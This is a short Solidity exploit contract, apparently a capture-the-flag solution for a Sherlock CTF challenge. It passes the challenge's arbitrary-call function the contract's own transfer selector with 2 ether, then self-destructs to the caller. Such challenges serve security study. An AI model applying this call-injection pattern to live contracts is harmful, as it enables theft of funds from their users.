// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;

import "hardhat/console.sol";

interface IChallenge_ych18 {
    function func(
        address,
        uint256,
        bytes4
    ) external payable;

    function DontGiveUp(string calldata, string calldata) external;

    function transfer(address, uint256) external payable;
}

contract Exploit_ych18 {
    IChallenge_ych18 instance;

    constructor(IChallenge_ych18 _instance) {
        instance = _instance;
        // instance = IChallenge_ych18(address(new FunnyChallenges()));
    }

    function finalize() external payable {
        instance.DontGiveUp("SherlockCTF", " ");
        instance.func{value: 2 ether}(address(instance), 1, IChallenge_ych18.transfer.selector);
        // instance.transfer{value: 2 ether}(address(this), 1);

        console.log(address(instance).balance);
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {}

    receive() external payable {}
}
